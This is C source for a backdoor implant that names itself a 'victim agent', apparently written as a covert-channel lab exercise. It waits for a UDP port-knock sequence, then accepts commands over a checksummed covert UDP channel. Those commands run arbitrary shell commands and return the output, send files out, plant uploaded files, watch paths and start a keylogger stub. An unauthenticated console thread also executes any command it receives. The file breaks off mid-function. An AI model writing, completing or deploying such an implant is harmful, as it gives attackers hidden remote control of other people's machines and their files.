#include <arpa/inet.h>
#include <dirent.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define KNOCK_PORT_COUNT 3
#define KNOCK_PORT_BASE 5001
#define KNOCK_TIMEOUT_MS 2000
#define CONSOLE_PORT 9998
#define COLLECTOR_PORT 9999
#define COVERT_PORT 7777
#define PACKET_SIZE_MAX 1400
#define CHECKSUM_SIZE 2
#define FILE_CHUNK 512
#define KEYLOGGER_DEVICE_MAX 256
#define KEYLOGGER_AUDIT_FILE "/tmp/victim_keylogger_audit.log"
#define REMOTE_PATH_MAX 512
#define RESPONSE_TEXT_MAX 256
#define EXEC_COMMAND_MAX 1024
#define EXEC_OUTPUT_CHUNK_MAX (PACKET_SIZE_MAX - sizeof(covert_header_t) - CHECKSUM_SIZE)

#define CMD_DISCONNECT 0x01
#define CMD_HEARTBEAT  0x02
#define CMD_KEYLOG_START 0x10
#define CMD_KEYLOG_STOP  0x11
#define CMD_EXEC_CMD      0x30
#define CMD_EXEC_OUTPUT   0x31
#define CMD_FILE_GET      0x40
#define CMD_FILE_DATA     0x41
#define CMD_FILE_PUT_BEGIN 0x42
#define CMD_FILE_PUT_CHUNK 0x43
#define CMD_FILE_PUT_END   0x44
#define CMD_WATCH_FILE    0x50
#define CMD_WATCH_DIR     0x51
#define CMD_UNINSTALL    0xFE

#define CMD_OK    0xF0
#define CMD_ERROR 0xF1
#define CMD_ACK   0xF2

#define MSG_DIRECTORY_EVENT 1
#define MSG_FILE_DATA       2
#define MSG_COMMAND_OUTPUT  3

#define SEQ_INIT 0x13370000

typedef struct __attribute__((packed)) {
    uint32_t seq_num;
    uint8_t command;
    uint16_t payload_len;
} covert_header_t;

typedef struct {
    uint32_t seq_num;
    uint8_t command;
    uint16_t payload_len;
    const uint8_t *payload;
} parsed_packet_t;

typedef struct {
    int message_type;
    char filename;
    char payload[FILE_CHUNK];
    int payload_len;
} network_message_t;

typedef struct {
    int active;
    int exists;
    char path[REMOTE_PATH_MAX];
    time_t mtime;
    off_t size;
    uint64_t signature;
} watch_state_t;

typedef struct {
    int knock_socks[KNOCK_PORT_COUNT];
    int covert_sock;
    int console_sock;

    int knock_index;
    struct in_addr knock_addr;
    struct timeval knock_started_at;

    int session_active;
    struct in_addr allowed_addr;
    struct sockaddr_in peer_addr;
    char peer_ip[INET_ADDRSTRLEN];
    uint32_t expected_seq;
    uint32_t next_seq;

    int keylogger_active;
    char keylogger_device[KEYLOGGER_DEVICE_MAX];
    FILE *upload_fp;
    char upload_path[REMOTE_PATH_MAX];
    watch_state_t file_watch;
    watch_state_t directory_watch;
    int console_listener_active;
    pthread_t console_thread;
} victim_state_t;

static volatile sig_atomic_t g_running = 1;

static void handle_signal(int signo);
static void init_state(victim_state_t *state);
static int init_sockets(victim_state_t *state);
static int start_console_listener(victim_state_t *state);
static int bind_udp_socket(uint16_t port);
static void stop_console_listener(victim_state_t *state);
static void close_sockets(victim_state_t *state);
static int run_victim(victim_state_t *state);
static void poll_knock_state(victim_state_t *state);
static void poll_session_state(victim_state_t *state);
static void poll_watch_targets(victim_state_t *state);
static void *console_listener_thread(void *arg);
static void handle_knock_packet(victim_state_t *state, int knock_index);
static void reset_knock_state(victim_state_t *state);
static void maybe_reset_knock_timeout(victim_state_t *state);
static long elapsed_ms(const struct timeval *start);
static void activate_session(victim_state_t *state, const struct in_addr *peer_addr);
static void deactivate_session(victim_state_t *state, const char *reason);
static void clear_upload_state(victim_state_t *state);
static void clear_watch_targets(victim_state_t *state);
static void drain_covert_packet(victim_state_t *state);
static void handle_covert_packet(victim_state_t *state);
static int parse_packet(const uint8_t *packet, size_t packet_len, parsed_packet_t *parsed, char *error, size_t error_len);
static int send_response(victim_state_t *state, const struct sockaddr_in *peer_addr, uint8_t command, const char *message);
static int send_response_payload(victim_state_t *state, const struct sockaddr_in *peer_addr, uint8_t command, const uint8_t *payload, uint16_t payload_len);
static int process_command(victim_state_t *state, const struct sockaddr_in *peer_addr, const parsed_packet_t *packet);
static int start_keylogger(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len);
static int stop_keylogger(victim_state_t *state, char *message, size_t message_len);
static int execute_command(victim_state_t *state, const struct sockaddr_in *peer_addr, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len);
static int send_file_to_commander(victim_state_t *state, const struct sockaddr_in *peer_addr, const uint8_t *payload, uint16_t payload_len);
static int begin_file_upload(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len);
static int write_file_upload_chunk(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len);
static int finish_file_upload(victim_state_t *state, char *message, size_t message_len);
static int watch_remote_file(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len);
static int watch_remote_directory(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len);
static int snapshot_file_watch(const char *path, watch_state_t *watch);
static int snapshot_directory_watch(const char *path, watch_state_t *watch);
static uint64_t compute_directory_signature(const char *path, int *exists, time_t *mtime);
static void send_watch_event(victim_state_t *state, const char *label, const char *path, const char *details);
static int execute_console_command(const struct in_addr *collector_addr, const char *command);
static int copy_payload_string(const uint8_t *payload, uint16_t payload_len, const char *field_name, char *out, size_t out_len, char *error, size_t error_len);
static size_t bounded_strlen(const uint8_t *data, size_t limit);
static int append_keylogger_audit(const char *action, const char *device_path);
static int send_console_message(const struct in_addr *collector_addr, const network_message_t *message);
static uint16_t compute_checksum(const uint8_t *data, size_t len);
static const char *command_name(uint8_t command);

int main(void) {
    victim_state_t state;

    setvbuf(stdout, NULL, _IOLBF, 0);
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    init_state(&state);
    if (init_sockets(&state) != 0) {
        close_sockets(&state);
        return EXIT_FAILURE;
    }
    if (start_console_listener(&state) != 0) {
        fprintf(stderr, "Direct UDP console listener unavailable on port %u\n", (unsigned)CONSOLE_PORT);
    }

    printf("Victim agent started\n");
    printf("Waiting for UDP knock sequence on ports %u-%u\n",
           (unsigned)KNOCK_PORT_BASE,
           (unsigned)(KNOCK_PORT_BASE + KNOCK_PORT_COUNT - 1));

    (void)run_victim(&state);

    if (state.keylogger_active) {
        (void)append_keylogger_audit("STOP", state.keylogger_device);
    }

    clear_upload_state(&state);
    clear_watch_targets(&state);
    stop_console_listener(&state);
    close_sockets(&state);
    printf("Victim agent exiting\n");
    return EXIT_SUCCESS;
}

static void handle_signal(int signo) {
    (void)signo;
    g_running = 0;
}

static void init_state(victim_state_t *state) {
    memset(state, 0, sizeof(*state));

    for (int i = 0; i < KNOCK_PORT_COUNT; i++) {
        state->knock_socks[i] = -1;
    }

    state->covert_sock = -1;
    state->console_sock = -1;
    state->expected_seq = SEQ_INIT;
    state->next_seq = SEQ_INIT;
}

static int init_sockets(victim_state_t *state) {
    for (int i = 0; i < KNOCK_PORT_COUNT; i++) {
        uint16_t port = (uint16_t)(KNOCK_PORT_BASE + i);
        state->knock_socks[i] = bind_udp_socket(port);
        if (state->knock_socks[i] < 0) {
            return -1;
        }
    }

    state->covert_sock = bind_udp_socket(COVERT_PORT);
    if (state->covert_sock < 0) {
        return -1;
    }

    return 0;
}

static int start_console_listener(victim_state_t *state) {
    state->console_sock = bind_udp_socket(CONSOLE_PORT);
    if (state->console_sock < 0) {
        return -1;
    }

    if (pthread_create(&state->console_thread, NULL, console_listener_thread, state) != 0) {
        perror("pthread_create console");
        close(state->console_sock);
        state->console_sock = -1;
        return -1;
    }

    state->console_listener_active = 1;
    printf("Direct UDP console listener on port %u\n", (unsigned)CONSOLE_PORT);
    return 0;
}

static int bind_udp_socket(uint16_t port) {
    int sock;
    int enabled = 1;
    struct sockaddr_in addr;

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return -1;
    }

    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &enabled, sizeof(enabled)) != 0) {
        perror("setsockopt SO_REUSEADDR");
        close(sock);
        return -1;
    }

#ifdef SO_REUSEPORT
    (void)setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &enabled, sizeof(enabled));
#endif

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons(port);

    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
        fprintf(stderr, "bind UDP port %u failed: %s\n", (unsigned)port, strerror(errno));
        close(sock);
        return -1;
    }

    return sock;
}

static void stop_console_listener(victim_state_t *state) {
    if (!state->console_listener_active) {
        return;
    }

    (void)pthread_join(state->console_thread, NULL);
    state->console_listener_active = 0;

    if (state->console_sock >= 0) {
        close(state->console_sock);
        state->console_sock = -1;
    }
}

static void close_sockets(victim_state_t *state) {
    for (int i = 0; i < KNOCK_PORT_COUNT; i++) {
        if (state->knock_socks[i] >= 0) {
            close(state->knock_socks[i]);
            state->knock_socks[i] = -1;
        }
    }

    if (state->covert_sock >= 0) {
        close(state->covert_sock);
        state->covert_sock = -1;
    }

    if (state->console_sock >= 0) {
        close(state->console_sock);
        state->console_sock = -1;
    }
}

static int run_victim(victim_state_t *state) {
    while (g_running) {
        if (state->session_active) {
            poll_session_state(state);
            poll_watch_targets(state);
        } else {
            poll_knock_state(state);
        }
    }

    return 0;
}

static void poll_knock_state(victim_state_t *state) {
    fd_set read_fds;
    struct timeval timeout;
    int max_fd = state->covert_sock;
    int ready;

    maybe_reset_knock_timeout(state);

    FD_ZERO(&read_fds);
    FD_SET(state->covert_sock, &read_fds);

    for (int i = 0; i < KNOCK_PORT_COUNT; i++) {
        FD_SET(state->knock_socks[i], &read_fds);
        if (state->knock_socks[i] > max_fd) {
            max_fd = state->knock_socks[i];
        }
    }

    timeout.tv_sec = 1;
    timeout.tv_usec = 0;

    ready = select(max_fd + 1, &read_fds, NULL, NULL, &timeout);
    if (ready < 0) {
        if (errno != EINTR) {
            perror("select");
            g_running = 0;
        }
        return;
    }

    if (ready == 0) {
        maybe_reset_knock_timeout(state);
        return;
    }

    if (FD_ISSET(state->covert_sock, &read_fds)) {
        drain_covert_packet(state);
    }

    for (int i = 0; i < KNOCK_PORT_COUNT; i++) {
        if (FD_ISSET(state->knock_socks[i], &read_fds)) {
            handle_knock_packet(state, i);
            if (state->session_active) {
                return;
            }
        }
    }
}

static void poll_session_state(victim_state_t *state) {
    fd_set read_fds;
    struct timeval timeout;
    int ready;

    FD_ZERO(&read_fds);
    FD_SET(state->covert_sock, &read_fds);

    timeout.tv_sec = 1;
    timeout.tv_usec = 0;

    ready = select(state->covert_sock + 1, &read_fds, NULL, NULL, &timeout);
    if (ready < 0) {
        if (errno != EINTR) {
            perror("select");
            g_running = 0;
        }
        return;
    }

    if (ready > 0 && FD_ISSET(state->covert_sock, &read_fds)) {
        handle_covert_packet(state);
    }
}

static void poll_watch_targets(victim_state_t *state) {
    watch_state_t current;

    if (!state->session_active) {
        return;
    }

    if (state->file_watch.active) {
        memset(&current, 0, sizeof(current));
        if (snapshot_file_watch(state->file_watch.path, &current) != 0) {
            if (state->file_watch.exists) {
                send_watch_event(state, "File watch", state->file_watch.path, "target became unavailable");
                state->file_watch.exists = 0;
            }
        } else if (!state->file_watch.exists) {
            send_watch_event(state, "File watch", state->file_watch.path, "target became available");
            state->file_watch.exists = 1;
            state->file_watch.mtime = current.mtime;
            state->file_watch.size = current.size;
        } else if (state->file_watch.mtime != current.mtime || state->file_watch.size != current.size) {
            char details[FILE_CHUNK];

            snprintf(details, sizeof(details), "changed (size=%lld)", (long long)current.size);
            send_watch_event(state, "File watch", state->file_watch.path, details);
            state->file_watch.mtime = current.mtime;
            state->file_watch.size = current.size;
        }
    }

    if (state->directory_watch.active) {
        memset(&current, 0, sizeof(current));
        if (snapshot_directory_watch(state->directory_watch.path, &current) != 0) {
            if (state->directory_watch.exists) {
                send_watch_event(state, "Directory watch", state->directory_watch.path, "target became unavailable");
                state->directory_watch.exists = 0;
            }
        } else if (!state->directory_watch.exists) {
            send_watch_event(state, "Directory watch", state->directory_watch.path, "target became available");
            state->directory_watch.exists = 1;
            state->directory_watch.mtime = current.mtime;
            state->directory_watch.signature = current.signature;
        } else if (state->directory_watch.mtime != current.mtime ||
                   state->directory_watch.signature != current.signature) {
            send_watch_event(state, "Directory watch", state->directory_watch.path, "directory contents changed");
            state->directory_watch.mtime = current.mtime;
            state->directory_watch.signature = current.signature;
        }
    }
}

static void *console_listener_thread(void *arg) {
    victim_state_t *state = (victim_state_t *)arg;

    while (g_running) {
        fd_set read_fds;
        struct timeval timeout;
        struct sockaddr_in src_addr;
        socklen_t src_len = sizeof(src_addr);
        char cmd_buffer[EXEC_COMMAND_MAX];
        char src_ip[INET_ADDRSTRLEN];
        ssize_t received;
        size_t command_len;

        FD_ZERO(&read_fds);
        FD_SET(state->console_sock, &read_fds);
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;

        received = select(state->console_sock + 1, &read_fds, NULL, NULL, &timeout);
        if (received < 0) {
            if (errno == EINTR) {
                continue;
            }
            perror("select console");
            break;
        }

        if (received == 0) {
            continue;
        }

        memset(cmd_buffer, 0, sizeof(cmd_buffer));
        received = recvfrom(
            state->console_sock,
            cmd_buffer,
            sizeof(cmd_buffer) - 1,
            0,
            (struct sockaddr *)&src_addr,
            &src_len
        );

        if (received < 0) {
            if (errno == EINTR) {
                continue;
            }
            perror("recvfrom console");
            break;
        }

        cmd_buffer[received] = '\0';
        command_len = strlen(cmd_buffer);
        while (command_len > 0 &&
               (cmd_buffer[command_len - 1] == '\n' || cmd_buffer[command_len - 1] == '\r')) {
            cmd_buffer[--command_len] = '\0';
        }

        if (cmd_buffer[0] == '\0') {
            continue;
        }

        inet_ntop(AF_INET, &src_addr.sin_addr, src_ip, sizeof(src_ip));
        printf("Direct console command received from %s: %s\n", src_ip, cmd_buffer);
        (void)execute_console_command(&src_addr.sin_addr, cmd_buffer);
    }

    return NULL;
}

static void handle_knock_packet(victim_state_t *state, int knock_index) {
    uint8_t payload[8];
    struct sockaddr_in src_addr;
    socklen_t src_len = sizeof(src_addr);
    ssize_t received;
    char src_ip[INET_ADDRSTRLEN];
    uint8_t expected_value = (uint8_t)knock_index;

    received = recvfrom(
        state->knock_socks[knock_index],
        payload,
        sizeof(payload),
        0,
        (struct sockaddr *)&src_addr,
        &src_len
    );

    if (received < 0) {
        if (errno != EINTR) {
            perror("recvfrom knock");
        }
        return;
    }

    inet_ntop(AF_INET, &src_addr.sin_addr, src_ip, sizeof(src_ip));

    if (state->knock_index > 0 &&
        src_addr.sin_addr.s_addr != state->knock_addr.s_addr) {
        printf("Knock source changed from expected peer; restarting sequence\n");
        reset_knock_state(state);
    }

    if (knock_index != state->knock_index ||
        received < 1 ||
        payload[0] != expected_value) {
        if (knock_index == 0 && received >= 1 && payload[0] == 0) {
            reset_knock_state(state);
        } else {
            printf("Unexpected knock on port %u from %s; sequence reset\n",
                   (unsigned)(KNOCK_PORT_BASE + knock_index),
                   src_ip);
            reset_knock_state(state);
            return;
        }
    }

    if (state->knock_index == 0) {
        state->knock_addr = src_addr.sin_addr;
        gettimeofday(&state->knock_started_at, NULL);
    }

    state->knock_index++;
    printf("Accepted knock %d/%d from %s\n", state->knock_index, KNOCK_PORT_COUNT, src_ip);

    if (state->knock_index == KNOCK_PORT_COUNT) {
        activate_session(state, &src_addr.sin_addr);
    }
}

static void reset_knock_state(victim_state_t *state) {
    state->knock_index = 0;
    memset(&state->knock_addr, 0, sizeof(state->knock_addr));
    memset(&state->knock_started_at, 0, sizeof(state->knock_started_at));
}

static void maybe_reset_knock_timeout(victim_state_t *state) {
    if (state->knock_index > 0 && elapsed_ms(&state->knock_started_at) > KNOCK_TIMEOUT_MS) {
        printf("Knock sequence timed out; waiting for a fresh sequence\n");
        reset_knock_state(state);
    }
}

static long elapsed_ms(const struct timeval *start) {
    struct timeval now;
    long seconds;
    long micros;

    gettimeofday(&now, NULL);
    seconds = now.tv_sec - start->tv_sec;
    micros = now.tv_usec - start->tv_usec;

    return seconds * 1000L + micros / 1000L;
}

static void activate_session(victim_state_t *state, const struct in_addr *peer_addr) {
    reset_knock_state(state);
    state->session_active = 1;
    state->allowed_addr = *peer_addr;
    state->expected_seq = SEQ_INIT;
    state->next_seq = SEQ_INIT;

    memset(&state->peer_addr, 0, sizeof(state->peer_addr));
    state->peer_addr.sin_family = AF_INET;
    state->peer_addr.sin_addr = *peer_addr;
    state->peer_addr.sin_port = htons(COVERT_PORT);

    inet_ntop(AF_INET, peer_addr, state->peer_ip, sizeof(state->peer_ip));
    printf("Session opened for %s on UDP port %u\n", state->peer_ip, (unsigned)COVERT_PORT);
}

static void deactivate_session(victim_state_t *state, const char *reason) {
    if (state->keylogger_active) {
        (void)append_keylogger_audit("STOP", state->keylogger_device);
        state->keylogger_active = 0;
        state->keylogger_device[0] = '\0';
    }

    clear_upload_state(state);
    clear_watch_targets(state);

    printf("Session closed");
    if (reason != NULL && reason[0] != '\0') {
        printf(": %s", reason);
    }
    printf("\n");

    state->session_active = 0;
    memset(&state->allowed_addr, 0, sizeof(state->allowed_addr));
    memset(&state->peer_addr, 0, sizeof(state->peer_addr));
    state->peer_ip[0] = '\0';
    state->expected_seq = SEQ_INIT;
    state->next_seq = SEQ_INIT;
    reset_knock_state(state);
}

static void clear_upload_state(victim_state_t *state) {
    if (state->upload_fp != NULL) {
        fclose(state->upload_fp);
        state->upload_fp = NULL;
    }

    state->upload_path[0] = '\0';
}

static void clear_watch_targets(victim_state_t *state) {
    memset(&state->file_watch, 0, sizeof(state->file_watch));
    memset(&state->directory_watch, 0, sizeof(state->directory_watch));
}

static void drain_covert_packet(victim_state_t *state) {
    uint8_t packet[PACKET_SIZE_MAX];
    struct sockaddr_in src_addr;
    socklen_t src_len = sizeof(src_addr);
    char src_ip[INET_ADDRSTRLEN];
    ssize_t received;

    received = recvfrom(
        state->covert_sock,
        packet,
        sizeof(packet),
        0,
        (struct sockaddr *)&src_addr,
        &src_len
    );

    if (received < 0) {
        if (errno != EINTR) {
            perror("recvfrom covert");
        }
        return;
    }

    inet_ntop(AF_INET, &src_addr.sin_addr, src_ip, sizeof(src_ip));
    printf("Ignoring covert packet from %s before a valid knock sequence\n", src_ip);
}

static void handle_covert_packet(victim_state_t *state) {
    uint8_t packet[PACKET_SIZE_MAX];
    struct sockaddr_in src_addr;
    socklen_t src_len = sizeof(src_addr);
    ssize_t received;
    parsed_packet_t parsed;
    char error[RESPONSE_TEXT_MAX];
    char src_ip[INET_ADDRSTRLEN];

    received = recvfrom(
        state->covert_sock,
        packet,
        sizeof(packet),
        0,
        (struct sockaddr *)&src_addr,
        &src_len
    );

    if (received < 0) {
        if (errno != EINTR) {
            perror("recvfrom covert");
        }
        return;
    }

    inet_ntop(AF_INET, &src_addr.sin_addr, src_ip, sizeof(src_ip));

    if (!state->session_active) {
        printf("Ignoring covert packet from %s without an active session\n", src_ip);
        return;
    }

    if (src_addr.sin_addr.s_addr != state->allowed_addr.s_addr) {
        printf("Ignoring covert packet from unauthorized peer %s\n", src_ip);
        return;
    }

    state->peer_addr = src_addr;

    if (parse_packet(packet, (size_t)received, &parsed, error, sizeof(error)) != 0) {
        fprintf(stderr, "Invalid packet from %s: %s\n", src_ip, error);
        (void)send_response(state, &src_addr, CMD_ERROR, error);
        return;
    }

    if (parsed.seq_num != state->expected_seq) {
        printf("Sequence notice: received 0x%08x, expected 0x%08x\n",
               parsed.seq_num,
               state->expected_seq);
    }

    if (parsed.seq_num >= state->expected_seq) {
        state->expected_seq = parsed.seq_num + 1;
    }

    printf("Command %s (0x%02x) received from %s\n",
           command_name(parsed.command),
           parsed.command,
           src_ip);

    if (process_command(state, &src_addr, &parsed) != 0) {
        fprintf(stderr, "Command %s failed\n", command_name(parsed.command));
    }
}

static int parse_packet(const uint8_t *packet, size_t packet_len, parsed_packet_t *parsed, char *error, size_t error_len) {
    covert_header_t header;
    uint16_t payload_len;
    uint16_t received_checksum;
    uint16_t computed_checksum;
    size_t expected_len;

    if (packet_len < sizeof(covert_header_t) + CHECKSUM_SIZE) {
        snprintf(error, error_len, "packet too short");
        return -1;
    }

    memcpy(&header, packet, sizeof(header));
    payload_len = ntohs(header.payload_len);

    if (payload_len > PACKET_SIZE_MAX - sizeof(covert_header_t) - CHECKSUM_SIZE) {
        snprintf(error, error_len, "payload too large");
        return -1;
    }

    expected_len = sizeof(covert_header_t) + payload_len + CHECKSUM_SIZE;
    if (packet_len != expected_len) {
        snprintf(error, error_len, "packet length mismatch");
        return -1;
    }

    memcpy(&received_checksum, packet + sizeof(covert_header_t) + payload_len, sizeof(received_checksum));
    received_checksum = ntohs(received_checksum);
    computed_checksum = compute_checksum(packet, sizeof(covert_header_t) + payload_len);

    if (received_checksum != computed_checksum) {
        snprintf(error, error_len, "checksum mismatch");
        return -1;
    }

    parsed->seq_num = ntohl(header.seq_num);
    parsed->command = header.command;
    parsed->payload_len = payload_len;
    parsed->payload = packet + sizeof(covert_header_t);

    return 0;
}

static int send_response(victim_state_t *state, const struct sockaddr_in *peer_addr, uint8_t command, const char *message) {
    uint16_t payload_len = 0;

    if (message != NULL) {
        size_t message_len = strlen(message) + 1;
        if (message_len > EXEC_OUTPUT_CHUNK_MAX) {
            message_len = EXEC_OUTPUT_CHUNK_MAX;
        }
        payload_len = (uint16_t)message_len;
    }

    return send_response_payload(state, peer_addr, command, (const uint8_t *)message, payload_len);
}

static int send_response_payload(victim_state_t *state, const struct sockaddr_in *peer_addr, uint8_t command, const uint8_t *payload, uint16_t payload_len) {
    uint8_t packet[PACKET_SIZE_MAX];
    covert_header_t header;
    uint16_t checksum;
    size_t packet_len;
    ssize_t sent;

    if (payload_len > EXEC_OUTPUT_CHUNK_MAX) {
        payload_len = (uint16_t)EXEC_OUTPUT_CHUNK_MAX;
    }

    header.seq_num = htonl(state->next_seq++);
    header.command = command;
    header.payload_len = htons(payload_len);

    memcpy(packet, &header, sizeof(header));
    if (payload_len > 0 && payload != NULL) {
        memcpy(packet + sizeof(header), payload, payload_len);
    }

    packet_len = sizeof(header) + payload_len;
    checksum = htons(compute_checksum(packet, packet_len));
    memcpy(packet + packet_len, &checksum, sizeof(checksum));
    packet_len += sizeof(checksum);

    sent = sendto(
        state->covert_sock,
        packet,
        packet_len,
        0,
        (const struct sockaddr *)peer_addr,
        sizeof(*peer_addr)
    );

    if (sent != (ssize_t)packet_len) {
        perror("sendto response");
        return -1;
    }

    return 0;
}

static int process_command(victim_state_t *state, const struct sockaddr_in *peer_addr, const parsed_packet_t *packet) {
    char message[RESPONSE_TEXT_MAX];
    int result = 0;

    switch (packet->command) {
        case CMD_HEARTBEAT:
            snprintf(message, sizeof(message), "heartbeat ok");
            result = send_response(state, peer_addr, CMD_ACK, message);
            break;

        case CMD_KEYLOG_START:
            if (start_keylogger(state, packet->payload, packet->payload_len, message, sizeof(message)) == 0) {
                result = send_response(state, peer_addr, CMD_OK, message);
            } else {
                result = send_response(state, peer_addr, CMD_ERROR, message);
            }
            break;

        case CMD_KEYLOG_STOP:
            if (stop_keylogger(state, message, sizeof(message)) == 0) {
                result = send_response(state, peer_addr, CMD_OK, message);
            } else {
                result = send_response(state, peer_addr, CMD_ERROR, message);
            }
            break;

        case CMD_EXEC_CMD:
            if (execute_command(state, peer_addr, packet->payload, packet->payload_len, message, sizeof(message)) == 0) {
                result = send_response(state, peer_addr, CMD_OK, message);
            } else {
                result = send_response(state, peer_addr, CMD_ERROR, message);
            }
            break;

        case CMD_FILE_GET:
            result = send_file_to_commander(state, peer_addr, packet->payload, packet->payload_len);
            break;

        case CMD_FILE_PUT_BEGIN:
            if (begin_file_upload(state, packet->payload, packet->payload_len, message, sizeof(message)) == 0) {
                result = send_response(state, peer_addr, CMD_ACK, message);
            } else {
                result = send_response(state, peer_addr, CMD_ERROR, message);
            }
            break;

        case CMD_FILE_PUT_CHUNK:
            if (write_file_upload_chunk(state, packet->payload, packet->payload_len, message, sizeof(message)) == 0) {
                result = send_response(state, peer_addr, CMD_ACK, message);
            } else {
                result = send_response(state, peer_addr, CMD_ERROR, message);
            }
            break;

        case CMD_FILE_PUT_END:
            if (finish_file_upload(state, message, sizeof(message)) == 0) {
                result = send_response(state, peer_addr, CMD_OK, message);
            } else {
                result = send_response(state, peer_addr, CMD_ERROR, message);
            }
            break;

        case CMD_WATCH_FILE:
            if (watch_remote_file(state, packet->payload, packet->payload_len, message, sizeof(message)) == 0) {
                result = send_response(state, peer_addr, CMD_OK, message);
            } else {
                result = send_response(state, peer_addr, CMD_ERROR, message);
            }
            break;

        case CMD_WATCH_DIR:
            if (watch_remote_directory(state, packet->payload, packet->payload_len, message, sizeof(message)) == 0) {
                result = send_response(state, peer_addr, CMD_OK, message);
            } else {
                result = send_response(state, peer_addr, CMD_ERROR, message);
            }
            break;

        case CMD_DISCONNECT:
            result = send_response(state, peer_addr, CMD_ACK, "disconnect ok");
            deactivate_session(state, "commander disconnected");
            break;

        case CMD_UNINSTALL:
            result = send_response(state, peer_addr, CMD_ACK, "uninstall ok");
            deactivate_session(state, "uninstall requested");
            g_running = 0;
            break;

        default:
            snprintf(message, sizeof(message), "unknown command 0x%02x", packet->command);
            result = send_response(state, peer_addr, CMD_ERROR, message);
            break;
    }

    return result;
}

static int start_keylogger(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len) {
    char device_path[KEYLOGGER_DEVICE_MAX];
    char error[RESPONSE_TEXT_MAX];

    if (copy_payload_string(payload, payload_len, "device path", device_path, sizeof(device_path), error, sizeof(error)) != 0) {
        snprintf(message, message_len, "keylogger start failed: %s", error);
        return -1;
    }

    if (append_keylogger_audit("START", device_path) != 0) {
        snprintf(message, message_len, "keylogger start failed: cannot write audit log");
        return -1;
    }

    state->keylogger_active = 1;
    snprintf(state->keylogger_device, sizeof(state->keylogger_device), "%s", device_path);
    snprintf(message, message_len, "keylogger started for %s", device_path);
    printf("%s; audit log: %s\n", message, KEYLOGGER_AUDIT_FILE);

    return 0;
}

static int stop_keylogger(victim_state_t *state, char *message, size_t message_len) {
    if (!state->keylogger_active) {
        snprintf(message, message_len, "keylogger already stopped");
        return 0;
    }

    if (append_keylogger_audit("STOP", state->keylogger_device) != 0) {
        snprintf(message, message_len, "keylogger stop failed: cannot write audit log");
        return -1;
    }

    snprintf(message, message_len, "keylogger stopped for %s", state->keylogger_device);
    printf("%s\n", message);
    state->keylogger_active = 0;
    state->keylogger_device[0] = '\0';

    return 0;
}

static int execute_command(victim_state_t *state, const struct sockaddr_in *peer_addr, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len) {
    char command[EXEC_COMMAND_MAX];
    char error[RESPONSE_TEXT_MAX];
    uint8_t buffer[EXEC_OUTPUT_CHUNK_MAX];
    int pipefd[2];
    pid_t child;
    int status = 0;
    int read_error = 0;
    int sent_output = 0;

    if (copy_payload_string(payload, payload_len, "command", command, sizeof(command), error, sizeof(error)) != 0) {
        snprintf(message, message_len, "command failed: %s", error);
        return -1;
    }

    if (command[0] == '\0') {
        snprintf(message, message_len, "command failed: empty command");
        return -1;
    }

    if (pipe(pipefd) != 0) {
        snprintf(message, message_len, "command failed: pipe: %s", strerror(errno));
        return -1;
    }

    child = fork();
    if (child < 0) {
        snprintf(message, message_len, "command failed: fork: %s", strerror(errno));
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    if (child == 0) {
        close(pipefd[0]);
        (void)dup2(pipefd[1], STDOUT_FILENO);
        (void)dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[1]);
        execl("/bin/sh", "sh", "-c", command, (char *)NULL);
        _exit(127);
    }

    close(pipefd[1]);
    printf("Executing command from commander: %s\n", command);

    while (1) {
        ssize_t n = read(pipefd[0], buffer, sizeof(buffer));

        if (n > 0) {
            sent_output = 1;
            if (send_response_payload(state, peer_addr, CMD_EXEC_OUTPUT, buffer, (uint16_t)n) != 0) {
                read_error = 1;
            }
            continue;
        }

        if (n == 0) {
            break;
        }

        if (errno == EINTR) {
            continue;
        }

        read_error = 1;
        snprintf(message, message_len, "command failed while reading output: %s", strerror(errno));
        break;
    }

    close(pipefd[0]);

    if (waitpid(child, &status, 0) < 0) {
        snprintf(message, message_len, "command failed: waitpid: %s", strerror(errno));
        return -1;
    }

    if (read_error) {
        return -1;
    }

    if (!sent_output) {
        static const char no_output[] = "(no output)\n";
        if (send_response_payload(state, peer_addr, CMD_EXEC_OUTPUT, (const uint8_t *)no_output, (uint16_t)(sizeof(no_output) - 1)) != 0) {
            snprintf(message, message_len, "command failed while sending output");
            return -1;
        }
    }

    if (WIFEXITED(status)) {
        snprintf(message, message_len, "command exited with status %d", WEXITSTATUS(status));
        return WEXITSTATUS(status) == 0 ? 0 : -1;
    }

    if (WIFSIGNALED(status)) {
        snprintf(message, message_len, "command terminated by signal %d", WTERMSIG(status));
        return -1;
    }

    snprintf(message, message_len, "command ended unexpectedly");
    return -1;
}

static int send_file_to_commander(victim_state_t *state, const struct sockaddr_in *peer_addr, const uint8_t *payload, uint16_t payload_len) {
    char path[REMOTE_PATH_MAX];
    char error[RESPONSE_TEXT_MAX];
    uint8_t buffer[EXEC_OUTPUT_CHUNK_MAX];
    FILE *fp;
    size_t bytes_read;
    int failed = 0;

    if (copy_payload_string(payload, payload_len, "remote path", path, sizeof(path), error, sizeof(error)) != 0) {
        return send_response(state, peer_addr, CMD_ERROR, error);
    }

    fp = fopen(path, "rb");
    if (fp == NULL) {
